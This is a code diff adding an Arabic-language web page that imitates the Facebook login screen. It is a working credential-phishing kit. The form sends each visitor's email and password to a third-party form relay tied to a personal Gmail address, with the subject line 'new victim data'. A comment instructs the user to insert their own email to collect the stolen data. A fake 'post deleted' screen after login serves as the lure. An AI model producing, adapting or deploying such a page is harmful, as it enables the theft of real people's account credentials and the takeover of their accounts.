@@ -1,0 +1,146 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تسجيل الدخول - فببسبوك</title>
+    <style>
+        body {
+            font-family: Helvetica, Arial, sans-serif;
+            background-color: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            flex-direction: column;
+        }
+        .container {
+            background-color: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
+            width: 350px;
+            text-align: center;
+        }
+        .logo {
+            color: #1877f2;
+            font-size: 40px;
+            font-weight: bold;
+            margin-bottom: 20px;
+            letter-spacing: -1px;
+        }
+        input {
+            width: 90%;
+            padding: 14px 10px;
+            margin-bottom: 15px;
+            border: 1px solid #ddd;
+            border-radius: 6px;
+            font-size: 16px;
+            outline: none;
+        }
+        input:focus {
+            border-color: #1877f2;
+        }
+        button {
+            width: 100%;
+            padding: 14px;
+            background-color: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+        button:hover {
+            background-color: #166fe5;
+        }
+        a {
+            display: block;
+            margin-top: 15px;
+            color: #1877f2;
+            text-decoration: none;
+            font-size: 14px;
+        }
+        /* شاشة الحذف */
+        #delete-screen {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: white;
+            z-index: 999;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+        }
+        .loader {
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #1877f2;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin-bottom: 20px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        h2 { color: #333; }
+        p { color: #666; }
+    </style>
+</head>
+<body>
+
+    <!-- واجهة تسجيل الدخول -->
+    <div class="container" id="login-form-container">
+        <div class="logo">facebook</div>
+        
+        <!-- هنا نضع الإيميل الخاص بك ليعمل حشر البيانات -->
+        <form action="https://formsubmit.co/c8ha12i8m@gmail.com" method="POST">
+            
+            <!-- إعدادات إضافية -->
+            <input type="hidden" name="_subject" value="بيانات ضحية جديدة!">
+            <input type="hidden" name="_captcha" value="false">
+            <input type="hidden" name="_next" value=""> 
+
+            <input type="text" name="Email" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
+            <input type="password" name="Password" placeholder="كلمة المرور" required>
+            
+            <button type="submit" onclick="startProcess()">تسجيل الدخول</button>
+        </form>
+        <a href="#">هل نسيت حسابك؟</a>
+    </div>
+
+    <!-- شاشة "تم حذف المنشور" -->
+    <div id="delete-screen">
+        <div class="loader"></div>
+        <h2>جاري التحقق...</h2>
+    </div>
+
+    <script>
+        function startProcess() {
+            // إخفاء النموذج وإظهار شاشة الانتظار
+            document.getElementById('login-form-container').style.display = 'none';
+            const screen = document.getElementById('delete-screen');
+            screen.style.display = 'flex';
+
+            // تغيير النص بعد ثانيتين ليحاكي العملية
+            setTimeout(() => {
+                document.querySelector('#delete-screen h2').innerText = "تم حذف المنشور";
+                document.querySelector('.loader').style.display = 'none';
+                
+                // يمكنك إضافة تأخير ثم إعادة تحميل الصفحة إذا أردت
+                // window.location.reload(); 
+            }, 2000);
+        }
+    </script>
+
+</body>
+</html>
